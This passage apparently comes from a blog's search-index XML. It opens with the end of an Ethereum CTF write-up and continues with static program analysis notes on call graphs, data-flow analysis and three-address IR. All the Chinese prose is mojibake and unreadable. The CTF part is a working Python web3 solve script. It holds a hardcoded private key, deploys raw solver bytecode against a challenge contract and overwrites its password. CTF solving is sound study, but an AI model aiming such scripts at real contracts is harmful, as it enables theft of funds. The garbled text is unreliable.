ä¸€æŠŠæ¢­è„šæœ¬</h2><p>éœ€è¦æ‰‹åŠ¨æ›¿æ¢é¢˜ç›®åœ°å€å’Œç§é’¥</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> solcx <span class="keyword">import</span> compile_files, install_solc</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPProvider:</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://43.143.170.225:20001&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span>(w3.is_connected())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_new_account</span>():</span><br><span class="line">    keys = w3.eth.account.create()</span><br><span class="line">    address = w3.to_checksum_address(keys.address)</span><br><span class="line">    privateKey = <span class="built_in">hex</span>(bytes_to_long(keys.key))</span><br><span class="line">    <span class="keyword">return</span> (address, privateKey)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">address, privateKey = create_new_account()</span></span><br><span class="line"><span class="string">print(privateKey)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">privateKey = <span class="string">&#x27;0x5bc768688b09f8df514db9f99214bc7ecf6c7772a7bb9a61e1d4430e621044a2&#x27;</span></span><br><span class="line">account = w3.eth.account.from_key(privateKey)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;player_address: &#x27;</span> + account.address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_transaction</span>(<span class="params">account, func, args=(<span class="params"></span>)</span>):</span><br><span class="line">    nonce = w3.eth.get_transaction_count(account.address)</span><br><span class="line">    txn = func(*args).build_transaction(&#123;</span><br><span class="line">        <span class="string">&#x27;from&#x27;</span>: account.address,</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: nonce</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn = w3.eth.account.sign_transaction(txn, account.key)</span><br><span class="line">    txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line">    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)</span><br><span class="line">    <span class="keyword">return</span> txn_receipt</span><br><span class="line"></span><br><span class="line">install_solc(version=<span class="string">&quot;0.7.2&quot;</span>)</span><br><span class="line">compiled_sol = compile_files(<span class="string">&#x27;Chall.sol&#x27;</span>, output_values=[<span class="string">&#x27;abi&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>], solc_version=<span class="string">&quot;0.7.2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_address = <span class="string">&#x27;0x7E289572f980aA581d5811cEA39e5dC9fc182e79&#x27;</span></span><br><span class="line">challenge_abi = compiled_sol[<span class="string">&#x27;Chall.sol:ezBytes&#x27;</span>][<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">challenge_contract = w3.eth.contract(address=challenge_address, abi=challenge_abi)</span><br><span class="line"><span class="comment">#if challenge_contract.functions.isSolved().call():</span></span><br><span class="line"><span class="comment">#    print(&#x27;Already solved.&#x27;)</span></span><br><span class="line"><span class="comment">#    exit(0)</span></span><br><span class="line"></span><br><span class="line">contract_interface = compiled_sol[<span class="string">&#x27;Chall.sol:Solver&#x27;</span>]</span><br><span class="line">solver_abi = contract_interface[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">solver_bytecode = <span class="string">&#x27;60198060093d393df3610000610000610000610000473361000055610000610000f1&#x27;</span></span><br><span class="line">solver_contract = w3.eth.contract(abi=solver_abi, bytecode=solver_bytecode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Creating solver contract...&#x27;</span>)</span><br><span class="line">solver_address = send_transaction(account, solver_contract.constructor).contractAddress</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Done, solver_address: &#x27;</span> + solver_address)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Solving...&#x27;</span>)</span><br><span class="line">send_transaction(account, challenge_contract.functions.challenge, (solver_address, ))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> challenge_contract.functions.check().call():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Solved&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">send_transaction(account, challenge_contract.functions.changePassword, (<span class="string">&quot;0x3232323232323232323232323232000000000000000000000000000000000000&quot;</span>, ))</span><br><span class="line"><span class="keyword">if</span> challenge_contract.functions.isSolved().call():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Success&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No&#x27;</span>)</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ETH </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è½¯ä»¶åˆ†æ-è¿‡ç¨‹é—´åˆ†æ</title>
      <link href="/2023/09/23/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
      <url>/2023/09/23/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿‡ç¨‹é—´åˆ†æ"><a href="#è¿‡ç¨‹é—´åˆ†æ" class="headerlink" title="è¿‡ç¨‹é—´åˆ†æ"></a>è¿‡ç¨‹é—´åˆ†æ</h1><h2 id="å¯»æ‰¾å¯èƒ½è¢«è°ƒç”¨çš„æ–¹æ³•"><a href="#å¯»æ‰¾å¯èƒ½è¢«è°ƒç”¨çš„æ–¹æ³•" class="headerlink" title="å¯»æ‰¾å¯èƒ½è¢«è°ƒç”¨çš„æ–¹æ³•"></a>å¯»æ‰¾å¯èƒ½è¢«è°ƒç”¨çš„æ–¹æ³•</h2><p>Dispatch(c,m) cæ˜¯ç±»ï¼Œmæ˜¯æ–¹æ³•</p><blockquote><p>ä¸¤ç§è¿”å›å€¼</p><ul><li>c.m</li><li>câ€™.m(câ€™æ˜¯cçš„çˆ¶ç±»ï¼Œå½“ç„¶å¦‚æœè¿™ä¸ªçˆ¶ç±»ä¹Ÿæ²¡æœ‰methodæ–¹æ³•ï¼Œè¿˜ä¼šç»§ç»­å¾€ä¸Šæ‰¾çˆ¶ç±»çš„çˆ¶ç±»)</li></ul></blockquote><p>special callå¯¹åº”å”¯ä¸€æ–¹æ³•ï¼Œvirtual callä¼šè°ƒç”¨dispatch</p><h3 id="Resolve-cs"><a href="#Resolve-cs" class="headerlink" title="Resolve(cs)"></a>Resolve(cs)</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162156090.png"                      alt="image-20231017185458682"                ><figcaption>image-20231017185458682</figcaption></figure></p><blockquote><p>æ¯”è¾ƒtrickyçš„virtualï¼Œå¯¹cå’Œcçš„æ‰€æœ‰å­ç±»éƒ½é‡‡ç”¨dispatchï¼Œå­ç±»åŒ…æ‹¬ç›´æ¥å­ç±»å’Œé—´æ¥å­ç±»ï¼Œæ‰€ä»¥ä¼šä¸€ç›´å»¶ä¼¸åˆ°æ ‘çš„å¶å­ç»“ç‚¹</p><p>javaç¼–è¯‘å‡ºçš„å­—èŠ‚ç å¯ä»¥åˆ¤æ–­è¿™ä¸‰ç§callæ–¹æ³•</p></blockquote><h2 id="CHA"><a href="#CHA" class="headerlink" title="CHA"></a>CHA</h2><p>ä¸¾ä¸ªğŸŒ°</p><p>cæ²¡æœ‰å­ç±»ï¼Œæ‰€ä»¥å°±è¿”å›è‡ªå·±çš„fooæ–¹æ³•</p><p>aè‡ªå·±æœ‰fooä¼šè¿”å›ï¼Œå†å¾€ä¸‹è¿˜ä¼šæ‰¾å­ç±»çš„fooï¼Œæ‰€ä»¥cdä¹ŸåŠ è¿›å»äº†</p><p>bè‡ªå·±æ²¡æœ‰fooï¼Œä½†å…¶çˆ¶ç±»Aæœ‰fooï¼Œæ‰€ä»¥dispatch(b,foo)ä¼šè¿”å›A.foo()ï¼Œä¸”å­ç±»Cã€Dçš„ä¹Ÿä¼šåŠ è¿›å»</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162156587.png"                      alt="image-20231017190308693"                ><figcaption>image-20231017190308693</figcaption></figure></p><blockquote><p>æš´éœ²çš„æ¼æ´ï¼Œå½“è§„å®šäº†bå°±æ˜¯Bå¯¹è±¡æ—¶è°ƒç”¨b.foo()æ—¶å…¶å®ä¸ä¼šè°ƒç”¨C.foo(),D.foo()</p><p>æ‰€ä»¥CHAä¸å¤ªå‡†</p></blockquote><h3 id="ç‰¹ç‚¹"><a href="#ç‰¹ç‚¹" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h3><p>å¿«é€Ÿï¼šåªçœ‹ç»§æ‰¿æ ‘</p><p>ä¸å‡†</p><blockquote><p>åº”ç”¨åœºæ™¯ï¼šideå‡½æ•°æ–¹æ³•æç¤º</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162156601.png"                      alt="image-20231017192938184"                ><figcaption>image-20231017192938184</figcaption></figure></p></blockquote><h2 id="è°ƒç”¨å›¾"><a href="#è°ƒç”¨å›¾" class="headerlink" title="è°ƒç”¨å›¾"></a>è°ƒç”¨å›¾</h2><p>æœ‰å‘å›¾</p><h3 id="æ„å»º"><a href="#æ„å»º" class="headerlink" title="æ„å»º"></a>æ„å»º</h3><p><strong><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162156885.png"                      alt="image-20231017193319093"                ><figcaption>image-20231017193319093</figcaption></figure></strong></p><blockquote><p>RMï¼šå­˜å‚¨å¯è¾¾æ–¹æ³•</p><p>WLï¼šå­˜å‚¨æ–¹æ³•</p><p>CGï¼šè°ƒç”¨å›¾</p></blockquote><h2 id="è¿‡ç¨‹é—´æ§åˆ¶æµå›¾â€“ICFG"><a href="#è¿‡ç¨‹é—´æ§åˆ¶æµå›¾â€“ICFG" class="headerlink" title="è¿‡ç¨‹é—´æ§åˆ¶æµå›¾â€“ICFG"></a>è¿‡ç¨‹é—´æ§åˆ¶æµå›¾â€“ICFG</h2><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162156700.png"                      alt="image-20231017194814707"                ><figcaption>image-20231017194814707</figcaption></figure></p><h2 id="è¿‡ç¨‹é—´æ•°æ®æµåˆ†æ"><a href="#è¿‡ç¨‹é—´æ•°æ®æµåˆ†æ" class="headerlink" title="è¿‡ç¨‹é—´æ•°æ®æµåˆ†æ"></a>è¿‡ç¨‹é—´æ•°æ®æµåˆ†æ</h2><h3 id="å¸¸é‡ä¼ æ’­"><a href="#å¸¸é‡ä¼ æ’­" class="headerlink" title="å¸¸é‡ä¼ æ’­"></a>å¸¸é‡ä¼ æ’­</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162157872.png"                      alt="image-20231017201825006"                ><figcaption>image-20231017201825006</figcaption></figure></p><blockquote><p>ä¸ä¹‹å‰ç±»ä¼¼ï¼Œå¸¸é‡æœ‰é‡å®šä¹‰çš„æƒ…å†µä¼škillæ‰ï¼ˆæ¯”å¦‚b&#x3D;ten()é‚£é‡Œï¼‰</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> program analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è½¯ä»¶åˆ†æ-æ•°æ®æµåˆ†æ</title>
      <link href="/2023/09/17/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
      <url>/2023/09/17/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®æµåˆ†æ"><a href="#æ•°æ®æµåˆ†æ" class="headerlink" title="æ•°æ®æµåˆ†æ"></a>æ•°æ®æµåˆ†æ</h1><p>æ•°æ®æµä¸»è¦ç ”ç©¶æ•°æ®æ€ä¹ˆåœ¨CFG(ç¨‹åºæµç¨‹å›¾ BB+è¾¹)ä¸­æµåŠ¨</p><h2 id="åŸºæœ¬æœ¯è¯­"><a href="#åŸºæœ¬æœ¯è¯­" class="headerlink" title="åŸºæœ¬æœ¯è¯­"></a>åŸºæœ¬æœ¯è¯­</h2><h3 id="input-and-output-states"><a href="#input-and-output-states" class="headerlink" title="input and output states"></a>input and output states</h3><p>æ±‡èšçš„æ—¶å€™é‚£ä¸ªç¬¦å·æ²¡æœ‰é™åˆ¶ï¼Œå¯èƒ½æ˜¯äº¤é›†ä¹Ÿå¯èƒ½æ˜¯å¹¶é›†</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162158663.png"                      alt="83744840e76eb367512eaae50ced66b9_0"                ><figcaption>83744840e76eb367512eaae50ced66b9_0</figcaption></figure></p><blockquote><p>statesä¼šè¢«å…³è”ä¸€ä¸ªvalue</p></blockquote><h2 id="Reaching-Definitions"><a href="#Reaching-Definitions" class="headerlink" title="Reaching Definitions"></a>Reaching Definitions</h2><p>æ³¨æ„ï¼šå¯¹äºEntryçš„INå’ŒOUTä¸ä½œæ›´æ–°</p><p>æ ¹æ®ç®—æ³•å¾—å‡ºåœ¨æ¯ä¸ªè¾¹é‡Œå¯¹æ¯ä¸ªdestinationæ˜¯å¦èƒ½reachçš„æŠ½è±¡è¡¨è¾¾å€¼</p><ul><li>å½“å‰å—ä¸­çš„Dï¼Œ-&gt;1</li><li>å½“å‰å—ä¸­çš„Dçš„å·¦å€¼ï¼Œåœ¨å…¶å®ƒå—çš„Dä¸­ä¹Ÿæ˜¯å·¦å€¼æ—¶ï¼Œkillæ‰ -&gt;0</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162158180.png"                      alt="image-20231008152249586"                ><figcaption>image-20231008152249586</figcaption></figure></p><blockquote><p>ç®—æ³•çš„ç»“æŸæ¡ä»¶æ˜¯æ¯ä¸ªoutå’Œä¸Šä¸€è½®ä¸€è‡´</p><p>æ¯ä¸ªoutçš„å˜åŒ–è§„å¾‹ï¼šåªä¼šä¸å˜æˆ–å¢é•¿æœ‰0-&gt;1 æˆ– 1-&gt;1,ä¸ä¼šæœ‰1-&gt;0</p><p>å› æ­¤ç®—æ³•ä¸€å®šä¼šç»“æŸï¼Œä¼šåˆ°è¾¾ä¸€ä¸ªä¸åŠ¨ç‚¹</p></blockquote><h2 id="Live-Variables"><a href="#Live-Variables" class="headerlink" title="Live Variables"></a>Live Variables</h2><p> æ³¨æ„ï¼šå¯¹äºExitçš„INå’ŒOUTä¸ä½œæ›´æ–°</p><h3 id="live"><a href="#live" class="headerlink" title="live"></a>live</h3><p>å½“ä¸€ä¸ªå˜é‡åœ¨ä¸€æ¡pathé‡Œæ²¡æœ‰è¢«redefineï¼Œåˆ™ç§°ä¸ºliveçš„</p><h3 id="æŠ½è±¡è¡¨ç¤º"><a href="#æŠ½è±¡è¡¨ç¤º" class="headerlink" title="æŠ½è±¡è¡¨ç¤º"></a>æŠ½è±¡è¡¨ç¤º</h3><p>ä¸reaching destinationç±»ä¼¼ï¼Œç”¨ä¸€äº›åˆ—äºŒè¿›åˆ¶æ•°è¡¨ç¤ºä¸€äº›åˆ—å˜é‡</p><h3 id="backward-or-forward"><a href="#backward-or-forward" class="headerlink" title="backward or forward"></a>backward or forward</h3><p>ä¸ºäº†è®¾è®¡ç®—æ³•ç®€ä¾¿ï¼Œä½¿ç”¨backward</p><blockquote><p>forwardä¼šä½¿å¾—åˆ¤æ–­liveæ¯”è¾ƒéº»çƒ¦</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162159683.png"                      alt="image-20231008154741475"                ><figcaption>image-20231008154741475</figcaption></figure></p><blockquote><p>å¯¹äºS1 å’Œ S2 ä½¿ç”¨may analysisï¼ŒæŠŠin å–å¹¶é›†ï¼ŒOUT[B]&#x3D;IN[S2] U IN[S1]</p><p>è¿™äº›inå’Œoutéƒ½æ˜¯å˜é‡çš„é›†åˆï¼Œ</p><h4 id="in-gt-outçš„ç®—æ³•"><a href="#in-gt-outçš„ç®—æ³•" class="headerlink" title="in-&gt;outçš„ç®—æ³•"></a>in-&gt;outçš„ç®—æ³•</h4><ul><li>IN[B]&#x3D;$use_B$ U (OUT[B]-$def_B$)</li><li>å¦‚æœuseåœ¨redefineä¹‹å‰ï¼Œä¹Ÿè®¤ä¸ºlive</li><li>å‡ºç°åœ¨å·¦å€¼è¯´æ˜è¢«redefine</li><li>å‡ºç°åœ¨å³å€¼è¯´æ˜è¢«use</li><li>å½“INä¸å˜æ—¶ç»“æŸ</li><li>å…ˆkill defineå†åŠ use</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162159255.png"                      alt="image-20231008161552115"                ><figcaption>image-20231008161552115</figcaption></figure></p><h4 id="ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œmay-analysisåˆå§‹åŒ–æ˜¯ç©ºï¼Œmust-analysisåˆå§‹åŒ–æ˜¯all"><a href="#ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œmay-analysisåˆå§‹åŒ–æ˜¯ç©ºï¼Œmust-analysisåˆå§‹åŒ–æ˜¯all" class="headerlink" title="ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œmay analysisåˆå§‹åŒ–æ˜¯ç©ºï¼Œmust analysisåˆå§‹åŒ–æ˜¯all"></a>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œmay analysisåˆå§‹åŒ–æ˜¯ç©ºï¼Œmust analysisåˆå§‹åŒ–æ˜¯all</h4></blockquote><h2 id="Available-Expression"><a href="#Available-Expression" class="headerlink" title="Available Expression"></a>Available Expression</h2><p>æ³¨æ„ï¼šå¯¹äºEntryçš„INå’ŒOUTä¸ä½œæ›´æ–°</p><p>åˆ¤æ–­è¡¨è¾¾å¼æ˜¯å¦availableï¼ˆæ˜¯å¦è¿˜èƒ½ç”¨ï¼Œä¸å‰ä¸€ä¸ªå—ç›¸æ¯”ï¼Œè¡¨ç¤ºçš„å€¼æ˜¯å¦å˜åŒ–ï¼‰</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162159844.png"                      alt="image-20231008165300469"                ><figcaption>image-20231008165300469</figcaption></figure></p><h3 id="æ•°æ®æŠ½è±¡"><a href="#æ•°æ®æŠ½è±¡" class="headerlink" title="æ•°æ®æŠ½è±¡"></a>æ•°æ®æŠ½è±¡</h3><p>1bitè¡¨ç¤ºä¸€ä¸ªexpression</p><h3 id="forward"><a href="#forward" class="headerlink" title="forward"></a>forward</h3><h3 id="ç®—æ³•"><a href="#ç®—æ³•" class="headerlink" title="ç®—æ³•"></a>ç®—æ³•</h3><ul><li>å¦‚æœæœ‰å˜é‡è¢«defineï¼Œè¦killæ‰å«æœ‰è¯¥å˜é‡çš„è¡¨è¾¾å¼</li><li>åŠ ä¸Šå‡ºç°çš„è¡¨è¾¾å¼</li><li>åˆå§‹åŒ–æ—¶é™¤äº†entryçš„outï¼Œå…¶å®ƒéƒ½æ˜¯å…¨é›†</li></ul><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162159385.png"                      alt="image-20231008165552249"                ><figcaption>image-20231008165552249</figcaption></figure></p><blockquote><p>must analysis</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162159204.png"                      alt="image-20231008170945074"                ><figcaption>image-20231008170945074</figcaption></figure></p><h2 id="å¸¸é‡ä¼ æ’­"><a href="#å¸¸é‡ä¼ æ’­" class="headerlink" title="å¸¸é‡ä¼ æ’­"></a>å¸¸é‡ä¼ æ’­</h2><h3 id="meetvalueè§„åˆ™"><a href="#meetvalueè§„åˆ™" class="headerlink" title="meetvalueè§„åˆ™"></a>meetvalueè§„åˆ™</h3><ul><li>NACï¼šnot a const</li><li>UNDEFï¼šæœªå®šä¹‰</li><li>cï¼šå¸¸é‡</li></ul><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202407162159277.png"                      alt="image-20231019194129111" style="zoom:25%;"                 ><figcaption>image-20231019194129111</figcaption></figure><blockquote><p>UNDEFâŠ“v&#x3D;v è§£é‡Šï¼šå¯èƒ½væ˜¯constï¼Œä½†è¿™æ ·ä¸€meetå°±æˆäº†constï¼Œä¼¼ä¹æ¼æŠ¥äº†ä¸€ä¸ªundefï¼Œä½†è¿™å…³æ³¨çš„æ˜¯å¸¸é‡ä¼ æ’­ï¼Œå¹¶ä¸æ˜¯live variablesï¼Œ</p><p>åœ¨åšå¸¸é‡ä¼ æ’­æ—¶ï¼Œä¼šå‡è®¾ç¨‹åºæ˜¯æ­£ç¡®çš„ï¼Œå› æ­¤å¦‚æœè¿™é‡ŒçœŸçš„meetåˆ°äº†UNDEFï¼Œå…¶å®æ˜¯ä¸ä¼šèµ°è¿™æ¡pathçš„</p></blockquote><h3 id="transferå‡½æ•°"><a href="#transferå‡½æ•°" class="headerlink" title="transferå‡½æ•°"></a>transferå‡½æ•°</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162200944.png"                      alt="image-20231019213608402"                ><figcaption>image-20231019213608402</figcaption></figure></p><blockquote><ul><li>åˆ é™¤xå˜é‡ï¼ˆredefineäº†ï¼‰</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> program analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è½¯ä»¶åˆ†æ-IR</title>
      <link href="/2023/09/07/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-IR/"/>
      <url>/2023/09/07/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-IR/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸­é—´è¡¨ç¤º"><a href="#ä¸­é—´è¡¨ç¤º" class="headerlink" title="ä¸­é—´è¡¨ç¤º"></a>ä¸­é—´è¡¨ç¤º</h1><h2 id="ç¼–è¯‘è¿‡ç¨‹"><a href="#ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="ç¼–è¯‘è¿‡ç¨‹"></a>ç¼–è¯‘è¿‡ç¨‹</h2><p>æºä»£ç </p><p>  ï½œè¯æ³•åˆ†æ</p><p>ç”Ÿæˆtokens</p><p>  ï½œè¯­æ³•åˆ†æ</p><p>ASTæŠ½è±¡è¯­æ³•æ ‘</p><p>  ï½œè¯­ä¹‰åˆ†æï¼ˆç±»å‹æ£€æŸ¥ä¹‹ç±»çš„ï¼Œç¼–è¯‘å™¨åšçš„æ¯”è¾ƒç®€å•ï¼‰</p><p>ä¿®é¥°åçš„ASTè¯­æ³•æ ‘</p><p>  ï½œè½¬æ¢å™¨</p><p>  IRï¼ˆå¯ä»¥è¿›è¡Œé™æ€åˆ†æï¼‰</p><p>  ï½œç”Ÿæˆå™¨</p><p>æœºå™¨ç </p><h2 id="AST-vs-IR"><a href="#AST-vs-IR" class="headerlink" title="AST vs IR"></a>AST vs IR</h2><h3 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h3><p>å°†ä»£ç æ‹†è§£æˆæ ‘å½¢</p><ul><li>å¯ä»¥å¿«é€Ÿè¿›è¡Œç±»å‹æ£€æŸ¥</li><li>çœ‹ä¸å‡ºæ§åˆ¶æµä¿¡æ¯</li></ul><h3 id="IRï¼ˆé™æ€åˆ†æé€‚ç”¨ï¼‰â€“-3-Address-Code"><a href="#IRï¼ˆé™æ€åˆ†æé€‚ç”¨ï¼‰â€“-3-Address-Code" class="headerlink" title="IRï¼ˆé™æ€åˆ†æé€‚ç”¨ï¼‰â€“ 3-Address Code"></a>IRï¼ˆé™æ€åˆ†æé€‚ç”¨ï¼‰â€“ 3-Address Code</h3><p>å°†ä»£ç æ‹†è§£æˆä¸€è¡Œä¸€è¡Œçš„ï¼ŒåŒæ—¶ç”¨åˆ°goto</p><ul><li>æ§åˆ¶æµä¿¡æ¯æ¯”è¾ƒæ˜æ˜¾</li><li>è¾ƒæ¸…æ™°</li></ul><blockquote><p>ä¸‰åœ°å€ç ï¼šæ¯ä¸ªä¸‰åœ°å€ç æœ€å¤šåŒ…å«3å“¥åœ°å€ </p><p>åœ°å€å½¢å¼</p><ul><li>å˜é‡å</li><li>å¸¸é‡</li><li>ç¼–è¯‘å™¨ç”Ÿæˆçš„é™æ€å˜é‡</li></ul></blockquote><h2 id="ä¸‰åœ°å€ç "><a href="#ä¸‰åœ°å€ç " class="headerlink" title="ä¸‰åœ°å€ç "></a>ä¸‰åœ°å€ç </h2><h3 id="å¸¸è§ç¬¦å·"><a href="#å¸¸è§ç¬¦å·" class="headerlink" title="å¸¸è§ç¬¦å·"></a>å¸¸è§ç¬¦å·</h3><ul><li>äºŒå…ƒæ“ä½œç¬¦</li><li>ä¸€å…ƒæ“ä½œç¬¦ </li><li>goto L æ— æ¡ä»¶è·³è½¬</li><li>if â€¦ goto L æœ‰æ¡ä»¶è·³è½¬</li></ul><h3 id="çœŸå®ä¸–ç•Œä¸­çš„3åœ°å€ç "><a href="#çœŸå®ä¸–ç•Œä¸­çš„3åœ°å€ç " class="headerlink" title="çœŸå®ä¸–ç•Œä¸­çš„3åœ°å€ç "></a>çœŸå®ä¸–ç•Œä¸­çš„3åœ°å€ç </h3><p>Sootï¼šåˆ†æjavaç¨‹åºå¯¹é™æ€åˆ†æå™¨</p><p>Jimpleï¼šSootçš„ä¸‰åœ°å€ç </p><h2 id="Jimple"><a href="#Jimple" class="headerlink" title="Jimple"></a>Jimple</h2><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>javaæºç </p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForLoop3AC</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">      x=x+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Basic-Blocks"><a href="#Basic-Blocks" class="headerlink" title="Basic Blocks"></a>Basic 